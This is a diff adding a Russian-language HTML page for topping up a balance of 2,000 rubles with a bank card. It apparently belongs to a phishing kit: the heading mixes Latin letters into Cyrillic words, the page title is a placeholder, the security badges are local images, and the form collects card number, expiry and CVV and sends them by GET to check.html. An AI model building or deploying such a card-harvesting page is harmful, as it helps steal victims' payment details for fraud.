@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <link href="http://fonts.cdnfonts.com/css/bambino-2" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="css/index.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+
+    <div class="wrapper">
+        <h2>Пополение бaнковской кaртой</h2>
+        <h3>2 000 ₽</h3>
+        <section class="cards">
+            <div class="card-bind ">
+                <div class="card-bind__wrap sber">
+                    <div class="card-bind__img">
+                        <img class="card-bind__logo" src="img/pay/sbermobilelogo.png" alt="">
+                        <img class="card-bind__name" src="img/pay/visa.png" alt="">
+                    </div>
+                    <div class="card-bind__text">
+                        <p>**** 4004</p>
+                        <p>03 / 23</p>
+                    </div>
+                </div>
+            </div>
+            <div class="card-add active">
+                <div class="card-add__wrap">
+                    <img src="img/pay/1.png" alt="">
+                    <p>Новая карта</p>
+                </div>
+            </div>
+        </section>
+        <section>
+            <form id="form" action="check.html" method="get">
+                <div class="card">
+                    <div class="card__wrapper">
+                        <div class="card-front">
+                            <div class="card-front__banks">
+                                <img class="card-front__bank-1" src="img/pay/mir.png" alt="">
+                                <img class="card-front__bank-2" src="img/pay/visa1.png" alt="">
+                                <img class="card-front__bank-3" src="img/pay/Mastercard.png" alt="">
+                                <img class="card-front__bank-4" src="img/pay/maestro.png" alt="">
+                                <img class="card-front__bank-5" src="img/pay/american_express.png" alt="">
+                                <img class="card-front__bank-6" src="img/pay/union.jpg" alt="">
+                            </div>
+                            <div class="card-front__num">
+                                <label class="">Номер карты</label>
+                                <input id="cardNum" pattern="[0-9]*" name="cardnumber" class="card-front__digit inputmode"
+                                    required autocomplete="cc-number" type="text">
+                                <label class="">Введите номер карты</label>
+                            </div>
+                            <div class="card-front__date">
+                                <label class=""> Действует до</label>
+                                <div class="card-front__date-wrap">
+                                    <input name="ccmonth" class="card-front__month inputmode card-front__date-st "
+                                        pattern="[0-9]{2}" required type="text" placeholder="MM" maxlength="2">
+                                    <label class=""> / </label>
+                                    <input name="ccyear" class="card-front__year inputmode card-front__date-st" pattern="[0-9]{2}"
+                                        required maxlength="2" autocomplete="cc-exp-year" type="text" placeholder="ГГ">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card-back">
+                            <div class="card-back__line"></div>
+                            <div class="card-back__cvv">
+                                <label>CVV/CVC</label>
+                                <input required maxlength="3" name="CVVCVC" class="card-back__digital inputmode "
+                                    pattern="[0-9]{3}" type="password" placeholder="000">
+                                <label>Три цифры с обратной сторны карты</label>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card__save">
+                        <div class="card__save-check">
+                            <div><input type="checkbox" name="save"></div><div><p>Запомнить карту. Это безопасно<img src="img/pay/icon.png" alt="">. <p>Сохраняя карту, вы
+                                соглашаетесь с <a href="#">условиями привязки карты</a>.</p></p></div>
+                        </div>
+                    </div>
+                    <div class="card__button">
+                        <button id="btn" type="submit">Пополнить</button>
+                    </div>
+                </div>
+            </form>
+        </section>
+        <section>
+            <div class="vefifed">
+                <img src="img/pay/psi.png" alt="">
+                <img src="img/pay/secur.png" alt="">
+                <img src="img/pay/verifedvisa.png" alt="">
+                
+            </div>
+        </section>
+    </div>
+    <script src="script/script.js"></script>
+</body>
+
+</html>
